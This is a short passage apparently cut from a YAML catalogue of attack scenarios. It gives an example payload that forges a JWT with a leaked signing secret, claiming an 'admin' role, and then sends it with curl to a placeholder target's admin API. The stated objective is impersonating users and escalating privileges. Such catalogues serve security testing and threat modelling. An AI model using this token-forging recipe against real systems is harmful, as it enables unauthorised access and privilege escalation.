      '
    example_payload: "# Using jwt.io or a CLI tool\njwt encode --secret \"leaked-jwt-secret\" \\\n  '{\"sub\":\"attacker\"\
      ,\"role\":\"admin\",\"iat\":1700000000}'\ncurl -H \"Authorization: Bearer <forged_token>\" https://target/api/admin\n"
    attacker_objective: 'Forge authentication tokens to impersonate any user, escalate privileges, or bypass access controls
